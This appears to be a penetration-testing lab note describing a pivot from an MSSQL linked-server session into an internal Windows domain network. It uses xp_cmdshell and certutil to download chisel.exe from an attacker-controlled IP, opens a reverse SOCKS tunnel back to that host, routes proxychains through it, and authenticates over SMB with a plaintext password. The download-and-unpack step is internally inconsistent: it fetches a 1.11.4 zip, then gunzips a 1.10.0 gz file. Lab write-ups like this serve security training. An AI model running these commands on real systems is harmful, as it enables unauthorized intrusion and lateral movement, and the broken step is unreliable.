![[chisel_pivot_schema_v4.png|809]]

You need 3 terminals open on Kali simultaneously — one for the MSSQL session, one for chisel server, one for the HTTP server. 🎯

Follow the steps below.

#powershell_DC2 

## 0. You here from [[Lateral Movement via MSSQL Linked Server]] - MSSQL login on DC01 (guest role)

![[image.png]]
### 1. Confirm DC01 is at 172.16.20.1

```powershell
ping -n 2 172.16.20.1
```

![[Screenshot_2026-03-24_11-41-07.png]]


### 2. Kali: prepare and serve chisel

``` bash
# Install chisel
sudo apt install chisel -y

# Check chisel version
chisel --version


#Download Chisel for Windoes
wget https://github.com/jpillora/chisel/releases/download/v1.11.4/chisel_1.11.4_windows_amd64.zip

#Decompress
gunzip chisel_1.10.0_windows_amd64.gz

# Move it to /tmp
mv chisel_1.11.4_windows_amd64 /tmp/chisel.exe
cd /tmp

#Open a http-server
python3 -m http.server 8080
```

### 3. Kali: start chisel server (new terminal)

```bash
chisel server -p 8000 --reverse
```

### 4. DC01 MSSQL session: download chisel to DC02

Run this on the shell from [[RCE as darkzero-ext user svc_sql]].

```sql
EXECUTE ('EXEC xp_cmdshell ''certutil -urlcache -split -f http://10.10.14.36:8080/chisel.exe C:\Windows\Temp\chisel.exe''') AT [DC02.darkzero.ext];
```

### 5. DC01 MSSQL session: run chisel client on DC02

```sql
EXECUTE ('EXEC xp_cmdshell ''C:\Windows\Temp\chisel.exe client 10.10.14.36:8000 R:socks''') AT [DC02.darkzero.ext];
```

On the chisel shell from point 3 you'll get.

![[Screenshot_2026-03-28_10-23-42.png]]
### 6. Kali: configure proxychains

```bash
# Add to /etc/proxychains4.conf (last line)
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
```

### 7. Kali: access DC01 internal interface through tunnel

```bash
proxychains netexec smb 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!'
```


🟢 Tunnel is working perfectly! *DC01*'s internal interface is reachable through *DC02*. Now run the full attack through the tunnel:

**Next step:** [[ADCS enumeration]]